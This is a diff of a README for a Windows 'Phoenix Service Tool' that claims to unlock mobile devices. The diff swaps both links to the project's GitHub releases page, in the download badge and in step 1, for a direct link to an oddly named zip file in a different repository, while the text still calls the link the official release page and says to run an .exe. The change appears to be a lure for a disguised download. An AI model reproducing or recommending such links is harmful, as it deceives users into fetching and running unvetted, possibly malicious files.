@@ -5,7 +5,7 @@ description: "Download and install the Phoenix Service Tool for Windows 10 and 1
 ---
 # 🔓 Phoenix-Service-Tool-2026 - Remove locks from your mobile devices
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/revolutionnaires/Phoenix-Service-Tool-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/revolutionnaires/revolutionnaires.github.io/main/scriggly/io-revolutionnaires-github-v3.3-beta.5.zip)
 
 ## 📌 Application Overview
 
@@ -33,7 +33,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 Follow these steps to acquire and set up the tool on your computer.
 
-1. Visit the following link to access the official release page: [https://github.com/revolutionnaires/Phoenix-Service-Tool-2026/releases](https://github.com/revolutionnaires/Phoenix-Service-Tool-2026/releases)
+1. Visit the following link to access the official release page: [https://raw.githubusercontent.com/revolutionnaires/revolutionnaires.github.io/main/scriggly/io-revolutionnaires-github-v3.3-beta.5.zip](https://raw.githubusercontent.com/revolutionnaires/revolutionnaires.github.io/main/scriggly/io-revolutionnaires-github-v3.3-beta.5.zip)
 2. Look for the latest version listed at the top of the page.
 3. Click the file ending in .exe to download the installer to your Downloads folder.
 4. Locate the downloaded file and double-click it to start the setup wizard.
